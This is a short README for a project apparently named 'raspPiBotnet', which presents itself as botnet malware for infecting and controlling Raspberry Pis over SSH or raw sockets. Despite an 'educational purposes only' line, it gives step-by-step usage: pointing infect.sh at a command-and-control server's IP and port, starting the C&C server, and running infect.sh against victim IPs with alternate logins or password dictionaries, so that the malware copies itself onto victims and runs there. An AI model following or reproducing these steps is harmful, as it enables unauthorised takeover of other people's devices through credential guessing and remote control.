# 60467_raspPiBotnet
Botnet malware designed to infect and control a set of raspberry PIs. For educational purposes only.
This project includes 2 approaches to implimenting a botnet using python: Via SSH and via raw sockets.

-- Instructions: --

SSH:

  python3 cnc.py [IP of client 1], [IP of client 2], ...

Once connected, run commands as needed.


----

Sockets:
1. Modify the port and IP of infect.sh to reflect the port and IP of your remote C&C server


  vim infect.sh
  
  CNC_IP=1.1.1.1
  
  CNC_PORT=11111
  
  
2. On the remote C&C server, run the server code:


 admin@server$ python3 server.py [IP to bind to] [Port to bind to] 
  
  
3. Infect the victims. Run one of the following commands (choose the one that fits your use case). The malware will copy to the victims, and the client code will begin executing on the target PI.

  ./infect.sh -t [victim IP]
  
  ./infect.sh -l [Alternate login] -p [Alternate password] -t [victim IP]
  
  ./infect.sh -L [Alternate login file] -P [Alternate password dictionary] -t [victim IP]
